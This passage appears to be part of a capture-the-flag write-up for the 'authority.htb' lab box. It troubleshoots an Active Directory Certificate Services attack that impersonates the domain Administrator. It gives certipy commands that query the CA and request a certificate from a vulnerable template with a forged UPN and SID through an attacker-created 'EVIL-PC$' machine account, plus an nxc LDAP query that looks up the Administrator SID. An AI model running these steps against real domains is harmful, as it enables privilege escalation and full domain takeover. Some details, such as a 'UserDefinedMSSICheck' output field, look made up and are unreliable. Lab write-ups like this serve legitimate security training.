## Checking for "Strong Mapping" (The $KRB\_ERR\_GENERIC$ Culprit)

The "Generic Error" you saw earlier is often caused by a Windows security update (KB5014754) that requires certificates to have a specific **Object Identifier (OID)** that maps the certificate to the user's `objectSID`. If this is missing, the DC rejects the Kerberos request.

To check if the DC is enforcing this or has specific mapping requirements, use `certipy` to pull the CA configuration:

Bash

```
certipy ca -u 'EVIL-PC$' -p 'Password123!' -target authority.htb -ca 'AUTHORITY-CA' -info
```

### What to look for in the output:

- **`Strong Certificate Mapping`**: If this is "Enabled" or "Required," your certificate **must** contain the SID of the user you are impersonating.
    
- **`UserDefinedMSSICheck`**: If this is present, it means the DC is looking for a very specific mapping.
    

### How to fix it if Strong Mapping is the issue:

If the DC requires the SID mapping, you need to tell `certipy` the SID of the user you are impersonating (Administrator) when you request the certificate:

1. **Find the Administrator's SID** (using your low-priv credentials):
    
    Bash
    
    ```
    nxc ldap authority.htb -u 'user' -p 'pass' --query "(sAMAccountName=Administrator)"
    ```
    
2. **Re-request the certificate with the SID:**
    
    Bash
    
    ```
    certipy req -u 'EVIL-PC$' -p 'Password123!' -target authority.htb -ca 'AUTHORITY-CA' -template 'VULN_TEMPLATE' -upn 'Administrator@authority.htb' -sid 'S-1-5-21-...'
    ```
